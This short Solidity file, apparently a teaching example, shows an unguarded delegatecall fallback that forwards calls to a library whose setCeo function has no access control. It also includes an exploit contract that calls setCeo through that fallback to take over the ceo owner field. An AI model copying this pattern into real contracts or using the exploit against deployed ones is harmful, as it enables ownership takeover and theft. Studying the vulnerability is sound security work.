pragma solidity ^0.4.18;

/**
 * delegatecall
 */

contract Company  {
    address public ceo;
   
    function setCeo(address newCeo){
        ceo = newCeo;
    }
   
}

contract MainCompany  {
    address public ceo;
    address public lib = Company(0x15e08fa9fe3e3aa3607ac57a29f92b5d8cb154a2);
   
   function MainCompany(){
       ceo = msg.sender;
   }
   
    function() payable external {
        if(!lib.delegatecall(msg.data)) {
          revert();
        }
    }
    
}

contract VengoAHacermeCeoDeMainCompany{
    address public comp = MainCompany(0x9635e132729aa83b126ab8b159194196b5eeb069);
    
    function () external{
        comp.call(bytes4(keccak256("setCeo(address)")), address(0xdd870fa1b7c4700f2bd7f44238821c26f7392148));
    }

    
}
